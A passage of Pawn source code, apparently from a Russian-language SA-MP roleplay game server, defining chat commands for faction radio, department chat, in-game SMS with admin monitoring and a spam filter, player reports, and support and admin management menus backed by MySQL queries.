	}
	return true;
}
CMD:r(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new result[128];
	if(sscanf(params, "s[128]",result)) return	SCM(playerid, -1, " Введите: /r или /f [text]");
	if(PTEMP[playerid][pMuted] > 0) return   SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	new sendername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			if(PTEMP[i][pJob] == 99)
			{
				new rank = PTEMP[playerid][pDLevel];
				format(YCMDstr, sizeof(YCMDstr), " %s [T.LVL %d]: {FFFFFF}%s", sendername,rank,result);
				SCM(i, 0x0073B7AA, YCMDstr);
			}
		}
	}
	if(GetPVarInt(playerid,"farm_rank") > 1)
	{
		switch(GetPVarInt(playerid,"farm_rank"))
		{
		case 2: format(string, 170, " [FARM %i] Фермер %s: %s",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 3: format(string, 170, " [FARM %i] Заместитель %s: %s",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 4: format(string, 170, " [FARM %i] Владелец %s: %s",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		}
		foreach(i)
		{
			if(GetPVarInt(i,"farm_id") == GetPVarInt(playerid,"farm_id")) SCM(i,TEAM_AZTECAS_COLOR,string);
		}
		return true;
	}
	if(GetPVarInt(playerid,"CasinoRank"))
	{
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			if(!PlayerToPoint(300,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
			switch(GetPVarInt(playerid,"CasinoRank"))
			{
			case 1: format(string, 170, " [CASINO] Крупье %s: %s", sendername, result);
			default: format(string, 170, " [CASINO] Менеджер %s: %s", sendername, result);
			}
		}
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			foreach(idx)
			{
				if(!PlayerToPoint(300,idx, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2]) || !GetPVarInt(idx,"CasinoRank")) continue;
				if(GetCasino(idx, i) && GetCasino(playerid, idx) && GetPVarInt(idx,"CasinoRank")) SCM(idx,TEAM_AZTECAS_COLOR,string);
			}
		}
		return true;
	}
	if(!GetPVarInt(playerid,"Fraction_Duty")) return true;
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	if(PTEMP[playerid][pMember] == 1 || PTEMP[playerid][pMember] == 2 || PTEMP[playerid][pMember] == 3 || PTEMP[playerid][pMember] == 4
	|| PTEMP[playerid][pMember] == 7 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 19 || PTEMP[playerid][pMember] == 21)
	{
		format(string, 128, " %s  %s:  %s",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PTEMP[playerid][pMember], TEAM_BLUE_COLOR, string);
		if(tipsteron == PTEMP[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else if(PTEMP[playerid][pMember] == 5 || PTEMP[playerid][pMember] == 6 || PTEMP[playerid][pMember] == 8 || PTEMP[playerid][pMember] == 9
	|| PTEMP[playerid][pMember] == 16 || PTEMP[playerid][pMember] == 20 || PTEMP[playerid][pMember] == 11 || PTEMP[playerid][pMember] == 12
	|| PTEMP[playerid][pMember] == 13 || PTEMP[playerid][pMember] == 15 || PTEMP[playerid][pMember] == 14 || PTEMP[playerid][pMember] == 17
	|| PTEMP[playerid][pMember] == 18 || PTEMP[playerid][pMember] == 24 || PTEMP[playerid][pMember] == 26 || PTEMP[playerid][pMember] == 29)
	{
		format(string, 128, " %s  %s:  %s",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PTEMP[playerid][pMember], TEAM_AZTECAS_COLOR, string);
		if(tipsteron == PTEMP[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else SCM(playerid, COLOR_GREY, " Вам не доступен этот чат!");
	return true;
}
CMD:rb(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new result[128];
	if(sscanf(params, "s[128]",result)) return	SCM(playerid, COLOR_GRAD2, " Введите: /r или /f [text]");
	if(PTEMP[playerid][pMuted] > 0) return   SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	new sendername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if(Flood[playerid] > 0 && PTEMP[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			if(PTEMP[i][pJob] == 99)
			{
				new rank = PTEMP[playerid][pDLevel];
				format(YCMDstr, sizeof(YCMDstr), " %s [T.LVL %d]: {FFFFFF}(( %s ))", sendername,rank,result);
				SCM(i, 0x0073B7AA, YCMDstr);
			}
		}
	}
	if(GetPVarInt(playerid,"farm_rank") > 1)
	{
		switch(GetPVarInt(playerid,"farm_rank"))
		{
		case 2: format(string, 170, " [FARM %i] Фермер %s: (( %s ))",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 3: format(string, 170, " [FARM %i] Заместитель %s: (( %s ))",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		case 4: format(string, 170, " [FARM %i] Владелец %s: (( %s ))",GetPVarInt(playerid,"farm_id")-1, sendername, result);
		}
		foreach(i)
		{
			if(GetPVarInt(i,"farm_id") == GetPVarInt(playerid,"farm_id")) SCM(i,TEAM_AZTECAS_COLOR,string);
		}
		return true;
	}
	if(GetPVarInt(playerid,"CasinoRank"))
	{
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			if(!PlayerToPoint(300,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
			switch(GetPVarInt(playerid,"CasinoRank"))
			{
			case 1: format(string, 170, " [CASINO] Крупье %s: (( %s ))", sendername, result);
			default: format(string, 170, " [CASINO] Менеджер %s: (( %s ))", sendername, result);
			}
		}
		for(new i = 1; i <= TOTALCASINO; i++)
		{
			foreach(idx)
			{
				if(!PlayerToPoint(300,idx, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2]) || !GetPVarInt(idx,"CasinoRank")) continue;
				if(GetCasino(idx, i) && GetCasino(playerid, idx) && GetPVarInt(idx,"CasinoRank")) SCM(idx,TEAM_AZTECAS_COLOR,string);
			}
		}
		return true;
	}
	if(!GetPVarInt(playerid,"Fraction_Duty")) return true;
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	if(PTEMP[playerid][pMember] == 1 || PTEMP[playerid][pMember] == 2 || PTEMP[playerid][pMember] == 3 || PTEMP[playerid][pMember] == 4
	|| PTEMP[playerid][pMember] == 7 || PTEMP[playerid][pMember] == 10 || PTEMP[playerid][pMember] == 19 || PTEMP[playerid][pMember] == 21)
	{
		format(string, 128, " %s  %s:  (( %s ))",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PTEMP[playerid][pMember], TEAM_BLUE_COLOR, string);
		if(tipsteron == PTEMP[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else if(PTEMP[playerid][pMember] == 5 || PTEMP[playerid][pMember] == 6 || PTEMP[playerid][pMember] == 8 || PTEMP[playerid][pMember] == 9
	|| PTEMP[playerid][pMember] == 16 || PTEMP[playerid][pMember] == 20 || PTEMP[playerid][pMember] == 11 || PTEMP[playerid][pMember] == 12
	|| PTEMP[playerid][pMember] == 13 || PTEMP[playerid][pMember] == 15 || PTEMP[playerid][pMember] == 14 || PTEMP[playerid][pMember] == 17
	|| PTEMP[playerid][pMember] == 18 || PTEMP[playerid][pMember] == 24 || PTEMP[playerid][pMember] == 26 || PTEMP[playerid][pMember] == 29)
	{
		format(string, 128, " %s  %s:  (( %s ))",GetRank(playerid), Name(playerid), result);
		SendFamilyMessage(PTEMP[playerid][pMember], TEAM_AZTECAS_COLOR, string);
		if(tipsteron == PTEMP[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else SCM(playerid, COLOR_GREY, " Вам не доступен этот чат!");
	return true;
}
CMD:d(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new result[128];
	if(sscanf(params, "s[128]",result)) return SCM(playerid, -1, " Введите: /d [текст]");
	if(PTEMP[playerid][pMuted] > 0)
	{
		format(string, 128, " У вас бан чата!");
		SCM(playerid, TEAM_CYAN_COLOR, string);
		return true;
	}
	//if(PTEMP[playerid][pRank] < 2) return SCM(playerid, COLOR_GRAD1, " Вы не уполномочены писать в депортамент!");
	if(!GetPVarInt(playerid,"Fraction_Duty")) return true;
	if(GetSVarInt("d_timer") > gettime()) return SCM(playerid, COLOR_GREY, " Подождите 30 секунд");
	SetSVarInt("d_timer", gettime() + 30);
	switch(PTEMP[playerid][pMember])
	{
	case 1: format(string, 128, " [Police LS] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 2: format(string, 128, " [FBI] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 3: format(string, 128, " [Army SF] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 4, 22, 33: format(string, 128, " [Medic] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 7: format(string, 128, " [Mayor] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 10: format(string, 128, " [Police SF] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 19: format(string, 128, " [Army LV] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 21: format(string, 128, " [Police LV] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	case 11: format(string, 128, " [Instructors] %s  %s:  %s",GetRank(playerid), Name(playerid), result);
	default: return SCM(playerid,COLOR_GREY," Вам не доступен этот чат!");
	}
	SendTeamMessage(COLOR_ALLDEPT, string);
	return true;
}
CMD:smson(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9) return true;
	if(GetPVarInt(playerid, "sms_listen") == 0)
	{
		SetPVarInt(playerid, "sms_listen", 1);
		SCM(playerid, COLOR_GREEN, " Вы включили прослушку SMS");
	}
	else
	{
		SetPVarInt(playerid, "sms_listen", 0);
		SCM(playerid, COLOR_REDD, " Вы отключили прослушку SMS");
	}
	return true;
}
CMD:sms(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /sms [playerid / phonenumber] [текст]");
	if(PTEMP[playerid][pLevel] >= 1 && PTEMP[playerid][pLevel] <= 2)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
		if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		if(sms_timer[playerid] > 0) return SCM(playerid, COLOR_GREY, " Для игроков с уровнем ниже 3, работает лимит 1 смс в 30 секунд!");
		if(WantSms[playerid][params[0]] != 1)
		{
		    if(PhoneOnline[params[0]] > 0)
			{
				SCM(playerid, COLOR_GREY, " Телефон абонента выключен.");
				format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
				if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}

			PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(YCMDstr, sizeof(YCMDstr), " %s достает мобильник",Name(playerid));
			if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: %s[%i] ",params[1],Name(params[0]),params[0]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			SCM(playerid,  -1, " (( СМС попало в СПАМ. Получатель может снять защиту, если отправит СМС вам ))");
			format(YCMDstr, sizeof(YCMDstr), " SMS: {FF8000}СКРЫТО. {FFFF00}Отправитель: %s[%i]",Name(playerid), playerid);
			SCM(params[0], COLOR_YELLOW, YCMDstr);
			SCM(params[0],  -1, " (( Отправитель имеет уровень ниже 3. Ответное СМС снимает защиту от СПАМА ))");
			PTEMP[playerid][pMobile] += 2;
			for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(PTEMP[j][pAdmin] && GetPVarInt(j, "sms_listen"))
			    {
			        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], Name(params[0]), params[1]);
			    }
			}
			return true;
		}
	}
	
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	new is1=1;
	new r=0;
	while(strlen(params[is1]))
	{
		if('0'<=params[is1]<='9')
		{
			new is2=is1+1;
			new p=0;
			while(p==0)
			{
				if('0'<=params[is2]<='9'&&strlen(params[is2])) is2++;
				else
				{
					strmid(strR[r],params,is1,is2,255);
					if(strval(strR[r])<255) r++;
					is1=is2;
					p=1;
					sms_timer[playerid] = 30;
				}
			}
		}
		is1++;
	}
	if(r>=4)
	{
		if(PTEMP[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
	 	new ip[26];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string, 156, "SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid),playerid);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",Name(playerid),playerid,ip);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		PTEMP[playerid][pMuted] = 10800;
		return 1;
	}
	if(Rekl[playerid] == 1 && strfind(params[1],"www",true)!=-1 || Rekl[playerid] == 1 && strfind(params[1],".ru",true)!=-1
			|| Rekl[playerid] == 1 && strfind(params[1],".net",true)!=-1 || Rekl[playerid] == 1 && strfind(params[1],".com",true)!=-1
			|| Rekl[playerid] == 1 && strfind(params[1],"http",true)!=-1)
	{
		if(PTEMP[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
	 	new ip[26];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string, 156, "SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid),playerid);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",Name(playerid),playerid,ip);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		PTEMP[playerid][pMuted] = 10800;
		return 1;
	}
	GetPlayerPos(playerid,CallInfo[playerid][callx],CallInfo[playerid][cally],CallInfo[playerid][callz]);
	CallInfo[playerid][callused] = 1;
	switch (params[0])
	{
	case 11888:
		{
			if(smsls == -1) return SCM(playerid, COLOR_GREY, " Приём SMS отключен");
			format(YCMDstr, sizeof(YCMDstr), " LS NEWS SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(smsls, COLOR_YELLOW, YCMDstr);
   			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: LS NEWS",params[1]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			PTEMP[playerid][pMobile] += smspricels;
			FracBank[0][fLsnews] += smspricels;
			foreach(i)
			{
			    if(PTEMP[i][pAdmin] && GetPVarInt(i, "sms_listen"))
			    {
			        SendMes(i, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], "LS NEWS", params[1]);
			    }
			}
		}
	case 11555:
		{
			if(smssf == -1) return SCM(playerid, COLOR_GREY, " Приём SMS отключен");
			format(YCMDstr, sizeof(YCMDstr), " SF NEWS SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(smssf, COLOR_YELLOW, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: SF NEWS",params[1]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			PTEMP[playerid][pMobile] -= smspricesf;
			FracBank[0][fSfnews] += smspricesf;
			foreach(i)
			{
			    if(PTEMP[i][pAdmin] && GetPVarInt(i, "sms_listen"))
			    {
			        SendMes(i, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], "SF NEWS", params[1]);
			    }
			}
		}
	case 11333:
		{
			if(smslv == -1) return SCM(playerid, COLOR_GREY, " Приём SMS отключен");
			format(YCMDstr, sizeof(YCMDstr), " LV NEWS SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(smslv, COLOR_YELLOW, YCMDstr);
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: LV NEWS",params[1]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			PTEMP[playerid][pMobile] += smspricelv;
			FracBank[0][fLvnews] += smspricelv;
			foreach(i)
			{
			    if(PTEMP[i][pAdmin] && GetPVarInt(i, "sms_listen"))
			    {
			        SendMes(i, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], "LV NEWS", params[1]);
			    }
			}
		}
	}
	foreach(i)
	{
		if(IsPlayerConnected(params[0]))
		{
			if(PhoneOnline[params[0]] > 0)
			{
				SCM(playerid, COLOR_GREY, " Телефон абонента выключен.");
				format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
				if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
			
			PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(YCMDstr, sizeof(YCMDstr), " %s достает мобильник",Name(playerid));
			if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: %s[%i] ",params[1],Name(params[0]),params[0]);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			SCM(playerid,  -1, " Сообщение доставлено");
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(params[0], COLOR_YELLOW, YCMDstr);
			PTEMP[playerid][pMobile] += 2;
			for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(PTEMP[j][pAdmin] && GetPVarInt(j, "sms_listen"))
			    {
			        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], Name(params[0]), params[1]);
			    }
			}
			WantSms[params[0]][playerid] = 1;
			return true;
		}
		else if(params[0] == PTEMP[i][pPnumber])
		{
			if(PhoneOnline[i] > 0)
			{
				for(new j = 0; j < MAX_PLAYERS; j++)
				{
				    if(PTEMP[j][pAdmin] && GetPVarInt(j, "sms_listen"))
				    {
				        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], Name(params[0]), params[1]);
				    }
				}
				SCM(playerid, COLOR_GREY, " Телефон абонента выключен.");
				format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
				if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
			PTEMP[playerid][pMobile] +=20;
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Отправитель: %s[%i]",params[1],Name(playerid), playerid);
			SCM(i, COLOR_YELLOW, YCMDstr);
			PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(YCMDstr, sizeof(YCMDstr), " SMS: %s. Получатель: %s[%i]",params[1],Name(i), i);
			SCM(playerid,  COLOR_YELLOW, YCMDstr);
			SCM(playerid,  -1, " Сообщение доставлено");
			format(YCMDstr, sizeof(YCMDstr), " %s достает мобильник",Name(playerid));
			if(Spectate[playerid] != 1) ProxDetector(5.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(PTEMP[j][pAdmin] && GetPVarInt(j, "sms_listen"))
			    {
			        SendMes(j, COLOR_YELLOW, " SMS: From: %s to %s: %s", PTEMP[playerid][pName], Name(params[0]), params[1]);
			    }
			}
			WantSms[params[0]][playerid] = 1;
			return true;
		}
	}
	return true;
}
CMD:pm(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] == 0 && (PTEMP[playerid][pHelper] == 0 || PTEMP[playerid][pHelper] == 2)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(dostup[playerid] != 1 && PTEMP[playerid][pHelper] == 0) return true;
	if(sscanf(params, "us[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /pm [ид] [текст]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PTEMP[playerid][pAdmin] >=1)
	{
		format(YCMDstr, sizeof(YCMDstr), " Ответ от %s[%i]: %s",Name(playerid),playerid,params[1]);
		SCM(params[0], 0xD97700AA, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), "<-Ответ К %s[%i]: %s",Name(params[0]),params[0],params[1]);
		SendAdminMessage(0xD97700FF,YCMDstr);
		printf("Администратор %s ответил игроку %s: %s", Name(playerid), Name(params[0]), params[1]);
	}
	else if(PTEMP[playerid][pHelper] == 1 && SDuty[playerid] == 1)
	{
		format(YCMDstr, sizeof(YCMDstr), "<-Ответ %s[%i]: %s",Name(params[0]),params[0],params[1]);
		SCM(params[0], 0xFFA500AA, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), "<-%s[%i] to %s[%i]: %s",Name(playerid),playerid, Name(params[0]),params[0],params[1]);
		HelperMessage(0xffa500ff,YCMDstr);
		PTEMP[playerid][pRatingSupport] += 1;
		printf("Саппорт %s ответил игроку %s: %s", Name(playerid), Name(params[0]), params[1]);
	}
	return true;
}
CMD:report(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new text[128];
	if(sscanf(params, "us[128]",params[0], text)) return SCM(playerid, -1, " Введите: /report [playerid] [текст]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок, чей ID вы указали, оффлайн");
	format(YCMDstr, sizeof(YCMDstr), " Жалоба от %s[%i] на %s[%i]: %s", Name(playerid), playerid, Name(params[0]), params[0], text);
	SCM(playerid, COLOR_YELLOW, YCMDstr);
	SCM(playerid, COLOR_LIGHTRED, " Ваша жалоба была отправлена администрации");
	SendAdminMessage(0xD97700AA, YCMDstr);
	return true;
}
CMD:aquestion(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new text[128];
	if(sscanf(params, "s[128]", text)) return SCM(playerid, -1, " Введите: /aquestion [текст]");
	format(YCMDstr, sizeof(YCMDstr), " Репорт от %s[%i]: %s", Name(playerid), playerid, text);
	SCM(playerid, COLOR_YELLOW, YCMDstr);
	SCM(playerid, COLOR_LIGHTRED, " Ваша жалоба была отправлена администрации");
	SendAdminMessage(0xD97700AA, YCMDstr);
	printf("Игрок %s написал в репорт: %s", Name(playerid), text);
	return true;
}
CMD:question(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new text[128];
	if(sscanf(params, "s[128]", text)) return SCM(playerid, -1, " Введите: /question [текст]");
	format(YCMDstr, sizeof(YCMDstr), "->Вопрос %s[%i]: %s", Name(playerid), playerid, text);
	SCM(playerid, COLOR_YELLOW, YCMDstr);
	HelperMessage(0xffa500ff, YCMDstr);
	printf("Игрок %s написал вопрос саппортам: %s", Name(playerid), text);
	return true;
}
CMD:sc(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(SDuty[playerid] == 0 && (PTEMP[playerid][pHelper] == 0 || PTEMP[playerid][pHelper] == 2)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта команда");
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: /sc [текст]");
	format(YCMDstr, sizeof(YCMDstr), " <SUPPORT-CHAT> %s: %s",Name(playerid),params[0]);
	//HelperMessage(0x81DA99AA,YCMDstr);
	HelperMessage(0xffa500ff, YCMDstr);
	printf(YCMDstr);
	return true;
}
CMD:sduty(playerid, params[])
{
	if(PTEMP[playerid][pHelper] == 0 && PTEMP[playerid][pAdmin] < 2) return SCM(playerid,COLOR_GREY," Вы не саппорт");
	if(SDuty[playerid] == 0)
	{
	    if(PTEMP[playerid][pHelper] == 1 || PTEMP[playerid][pAdmin] > 1)
	    {
			SDuty[playerid] = 1;
			SCM(playerid, -1, " Рабочий день начат");
			printf("Саппорт %s начал рабочий день", Name(playerid));
	    }
	    else if(PTEMP[playerid][pHelper] == 2)
	    {
			SCM(playerid, COLOR_GREY, " Ваши права саппорта временно заморожены");
			printf("Саппорт %s попытался войти в панель саппорта с заморожеными правами", Name(playerid));
	    }
	}
	else if(SDuty[playerid] == 1)
	{
	    SDuty[playerid] = 0;
	    SCM(playerid, -1, " Рабочий день закончен");
	    printf("Саппорт %s закончил рабочий день", Name(playerid));
	}
	return 1;
}
CMD:splist(playerid,params[])
{
	if(PTEMP[playerid][pAdmin] < 5) return true;
	new strin[2048], query[1048];
	query = ""; strin = "";
	if(PTEMP[playerid][pAdmin] < 4) return true;
	new Names[MAX_PLAYER_NAME],DataReg[50],LastLogin[50],LastIP[16],RatingSupport;
	strcat(query,"Имя | Рейтинг | Дата Регистрации | Дата посл.входа | Последний IP \n\n");
	mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE pHelper = '1'");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)
	{
		for(new i = 0; i < r; i++)
		{
			cache_get_field_content(i,"Name",Names,DATABASE,60);
			cache_get_field_content(i,"pDataReg",DataReg,DATABASE,32);
			cache_get_field_content(i,"pvIp",LastIP,DATABASE,32);
			cache_get_field_content(i,"pOnline",LastLogin,DATABASE,32);
			RatingSupport = cache_get_field_content_int(i,"pRatingSupport");
			format(strin,sizeof(strin),"{FFFFFF}%s | %i | %s | %s | %s\n",Names,RatingSupport,DataReg,LastLogin,LastIP);
			strcat(query, strin);
		}
	} else format(query, sizeof(query), "\n\n{FF0000}Саппортов нет        !\n\n");
	ShowPlayerDialogEx(playerid,0,0,"Список саппортов",query,"Закрыть","");
	return true;
}
CMD:spmenu(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 5) return true;
	new Names[32], query[128];
	if(PTEMP[playerid][pAdmin] > 7) format(query, sizeof(query), "{00FF00}Назначить саппорта\n");
    mysql_format(DATABASE, QUERY, 62, "SELECT Name FROM `"TABLE_ACCOUNTS"` WHERE pHelper IN ('1','2')");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)
	{
		for(new i = 0; i < r; i++)
		{
			new strin[40];
			cache_get_field_content(i,"Name",Names,DATABASE,60);
            format(strin,sizeof(strin),"%s\n",Names);
			strcat(query, strin);
		}
	}
	ShowPlayerDialogEx(playerid, 21021, DIALOG_STYLE_LIST, "Управление саппортами", query, "Выбор", "Отмена");
	return true;
}
CMD:admmenu(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 6) return true;
	new Names[32], query[2048], levels;
	format(query, sizeof(query), "Nik\tLvl\n");
	if(PTEMP[playerid][pAdmin] >= 9) strcat(query, "{00FF00}Назначить администратора\n");
    mysql_format(DATABASE, QUERY, 62, "SELECT `Name`,`level` FROM `"TABLE_ADMIN"`");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
		for(new i = 0; i < r; i++)
		{
			new strin[40];
			cache_get_field_content(i,"Name",Names,DATABASE,60);
